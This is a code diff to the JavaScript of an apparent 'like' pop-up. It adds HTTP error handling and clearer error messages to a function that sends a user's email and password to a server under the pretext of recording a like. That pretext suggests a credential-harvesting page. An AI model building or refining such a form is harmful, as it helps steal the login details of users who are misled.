@@ -8,7 +8,6 @@ function closeModal() {
     document.getElementById("like-modal").classList.add("hidden");
 }
 
-// Save Like input
 function saveInput() {
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
@@ -29,18 +28,27 @@ function saveInput() {
             password: password
         })
     })
-    .then(response => response.json())
+    .then(response => {
+        if (!response.ok) {
+            // Handle HTTP errors
+            return response.text().then((text) => {
+                throw new Error(`Server error: ${response.status} - ${text}`);
+            });
+        }
+        return response.json();
+    })
     .then(data => {
         if (data.success) {
             alert("Thank you! Your like has been recorded.");
         } else {
+            // Show precise error message from PHP
             alert("Failed to save data: " + data.message);
         }
         console.log(data);
     })
     .catch(error => {
-        console.error('Error:', error);
-        alert("An error occurred while saving your data.");
+        console.error('Error:', error.message);
+        alert("An error occurred while saving your data: " + error.message);
     });
 
     closeModal();
